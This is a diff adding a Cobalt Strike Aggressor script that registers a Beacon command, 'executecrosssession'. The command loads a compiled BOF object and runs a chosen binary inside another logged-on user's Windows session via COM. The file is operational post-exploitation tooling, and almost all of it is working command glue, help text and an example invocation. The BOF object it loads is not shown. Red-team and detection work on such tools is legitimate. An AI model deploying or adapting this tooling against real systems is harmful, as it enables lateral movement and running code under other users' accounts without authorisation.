@@ -1,0 +1,41 @@
+# author REDMED-X
+
+beacon_command_register(
+	"executecrosssession", "Execute a binary on disk within the context of another logged-on user's session",
+	"INFO:\nExecute a binary on disk within the context of another logged-on user's session using COM.\n\n" .
+	"ARGUMENTS:\n[<binary path>]: path to the binary that you like to execute.\n[<session ID>]: specify the session ID of the user in which context the specified binary needs to be executed.\n\n" .
+	"USAGE:\nexecutecrosssession <binary path> <session ID>\n\n" .
+	"EXAMPLES:\nexecutecrosssession C:\\Windows\\System32\\calc.exe 2\n\n");
+	
+alias executecrosssession {
+    $bid = $1;
+    $binarypath = $2;
+    $sessionid = $3;
+
+    if ($binarypath eq "") {
+        berror($bid, "Please specify the path to the binary that you want to execute.\n");
+        return;
+    }
+
+
+    if ($sessionid eq "") {
+		berror($bid, "Please specify the session ID of the user under which you want the execute the binary.\n");
+		return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("executecrosssession.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "Zi", $binarypath, $sessionid);
+
+    blog($bid, "Tasked to cross-session execute a binary via COM..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
